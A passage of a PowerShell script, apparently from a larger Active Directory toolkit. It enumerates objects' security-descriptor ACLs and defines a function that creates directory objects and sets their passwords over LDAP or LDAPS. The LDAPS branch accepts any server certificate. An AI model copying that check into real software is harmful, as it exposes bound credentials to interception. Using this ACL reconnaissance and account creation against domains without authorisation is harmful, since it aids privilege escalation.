                foreach ($a in $_.Attributes.Keys | Sort-Object) {
                    if (($a -eq 'objectsid') -or ($a -eq 'securityidentifier') -or ($a -eq 'ntsecuritydescriptor')) {
                        $p[$a] = $_.Attributes[$a]
                    }
                    else {
                        $values = @()
                        foreach ($v in $_.Attributes[$a].GetValues([byte[]])) {
                            $values += [Text.Encoding]::UTF8.GetString($v)
                        }
                        $p[$a] = $values
                    }
                }
            }
            else {
                $p = $_.Properties
            }
            try {
                New-Object -TypeName Security.AccessControl.RawSecurityDescriptor -ArgumentList $p['ntsecuritydescriptor'][0], 0 | ForEach-Object { $_.DiscretionaryAcl } | ForEach-Object {
                    $_ | Add-Member NoteProperty 'ObjectDN' $p.distinguishedname[0]
                    $_ | Add-Member NoteProperty 'ActiveDirectoryRights' ([Enum]::ToObject([DirectoryServices.ActiveDirectoryRights], $_.AccessMask))
                    Write-Output $_
                }
            }
            catch {}
        }
    }

    End {
        if ($results -and -not $SSL) {
            $results.dispose()
        }
        if ($searcher) {
            $searcher.dispose()
        }
    }
}

Function Local:New-LdapObject {
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SSL,

        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $DistinguishedName,

        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [string]
        $Class,

        [ValidateNotNullOrEmpty()]
        [hashtable]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $objectDN = $null

    if ($SSL) {
        try {
            $rootDSE = Get-LdapRootDSE -Server $Server
            $defaultNC = $rootDSE.defaultNamingContext[0]
            $domain = $defaultNC -replace 'DC=' -replace ',','.'
            [Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
            $connection = New-Object -TypeName DirectoryServices.Protocols.LdapConnection -ArgumentList "$($Server):636"
            $connection.SessionOptions.SecureSocketLayer = $true
            $connection.SessionOptions.VerifyServerCertificate = {$true}
            $connection.SessionOptions.DomainName = $domain
            $connection.AuthType = [DirectoryServices.Protocols.AuthType]::Negotiate
            if ($Credential.UserName) {
                $connection.Bind($Credential)
            }
            else {
                $connection.Bind()
            }

            Write-Verbose "Attempting to create object $DistinguishedName..."
            $request = New-Object -TypeName DirectoryServices.Protocols.AddRequest
            $request.DistinguishedName = $DistinguishedName
            $request.Attributes.Add((New-Object -TypeName DirectoryServices.Protocols.DirectoryAttribute -ArgumentList "objectClass", $Class)) | Out-Null
            if ($Properties) {
                foreach ($property in $Properties.GetEnumerator()) {
                    $request.Attributes.Add((New-Object -TypeName DirectoryServices.Protocols.DirectoryAttribute -ArgumentList $property.Key, $property.Value)) | Out-Null
                }
            }

            $response = $connection.SendRequest($request)
            if ($response.ResultCode -eq 'Success') {
                $objectDN = $DistinguishedName
                Write-Verbose "Object created: $objectDN"
            }
        }
        catch {
            Write-Error $_
        }
    }
    else {
        try {
            $RDN = $DistinguishedName.Split(',')[0]
            $searchBase = $DistinguishedName -replace "^$($RDN),"
            $adsPath = "LDAP://$Server/$searchBase"
            if ($Credential.UserName) {
                $containerObject = New-Object -TypeName DirectoryServices.DirectoryEntry($adsPath, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            }
            else {
                $containerObject = New-Object -TypeName DirectoryServices.DirectoryEntry($adsPath)
            }

            Write-Verbose "Attempting to create object $DistinguishedName..."
            $newObject = $containerObject.Children.Add($RDN, $Class)
            $passwordBytes = $null
            if ($Properties) {
                foreach ($property in $Properties.GetEnumerator()) {
                    # unicodePwd can not be set in cleartext
                    if ($property.Key -ne 'unicodePwd') {
                        $newObject.Properties[$property.Key].Value = $property.Value
                    }
                    else {
                        $passwordBytes = $property.Value
                    }
                }
            }

            $newObject.CommitChanges()
            Write-Verbose "Object created: $($newObject.DistinguishedName)"

            if ($passwordBytes) {
                Write-Verbose "Attempting to set password..."
                $password = [Text.Encoding]::Unicode.GetString($passwordBytes).TrimStart('"').TrimEnd('"')
                $newObject.Invoke("SetPassword", $password)
            }
            $newObject.CommitChanges()

            $objectDN = $newObject.DistinguishedName
        }
        catch {
            Write-Error $_
        }
    }

    return $objectDN
}
